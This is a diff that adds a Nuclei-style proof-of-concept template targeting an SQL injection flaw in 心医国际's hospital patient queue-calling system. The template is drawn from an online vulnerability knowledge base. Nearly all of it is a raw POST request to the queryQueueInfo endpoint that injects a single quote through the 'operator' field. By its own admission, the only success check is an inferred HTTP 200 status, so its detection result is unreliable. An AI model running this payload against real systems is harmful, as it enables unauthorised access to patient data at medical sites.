@@ -1,0 +1,39 @@
+id: poc-b4cd87d193b23e59d613
+info:
+  name: 心医国际排队叫号系统SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/b4cd87d193b23e59d613c6483020282c
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: b4cd87d193b23e59d613c6483020282c
+http:
+- raw:
+  - 'POST /showqueue/showqueue/patient/queryQueueInfo HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Content-Length: 104
+
+
+    patientstatus=&queueID=&department=&waitarea=&name=&startTime=&endTime=&curPage=0&queueNumber=&operator='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
